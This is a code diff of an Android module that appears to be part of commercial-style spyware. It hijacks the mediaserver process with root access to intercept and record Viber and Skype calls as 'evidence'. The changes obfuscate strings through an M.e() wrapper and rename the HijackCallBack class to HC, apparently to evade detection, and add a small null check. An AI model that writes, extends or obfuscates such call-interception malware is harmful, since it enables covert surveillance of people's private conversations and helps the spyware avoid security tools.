@@ -158,8 +158,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			if (audioStorageOk) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(actualStart): starting audio storage management");
-					Execute.execute(new String[]{"touch", "/sdcard/1"});
-					Execute.executeRoot("touch /sdcard/2");
+					Execute.execute(new String[]{M.e("touch"), M.e("/sdcard/1")});
+					Execute.executeRoot(M.e("touch /sdcard/2"));
 				}
 
 				if (installHijack()) {
@@ -185,7 +185,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	private boolean installedWhitelist() {
 
-		String[] whitelist = new String[]{"com.viber.voip", "com.skype.raider"};
+		String[] whitelist = new String[]{M.e("com.viber.voip"), M.e("com.skype.raider")};
 
 		final ArrayList<PackageUtils.PInfo> res = new ArrayList<PackageUtils.PInfo>();
 		final PackageManager packageManager = Status.getAppContext().getPackageManager();
@@ -268,6 +268,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		observer = new FileObserver(AudioEncoder.getAudioStorage(), FileObserver.MOVED_TO) {
 			@Override
 			public void onEvent(int event, String file) {
+				if(file == null){
+					return;
+				}
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(onEvent): event: " + event + " for file: " + file);
 				}
@@ -300,7 +303,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 
 		hjcb = new CallBack();
-		hjcb.register(new HijackCallBack());
+		hjcb.register(new HC());
 
 		hijack = new Instrument(M.e("mediaserver"), AudioEncoder.getAudioStorage());
 
@@ -880,7 +883,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
 	}
 
-	public class HijackCallBack implements ICallBack {
+	public class HC implements ICallBack {
 		private static final String TAG = "HijackCallBack";
 
 		public <O> void run(O o) {
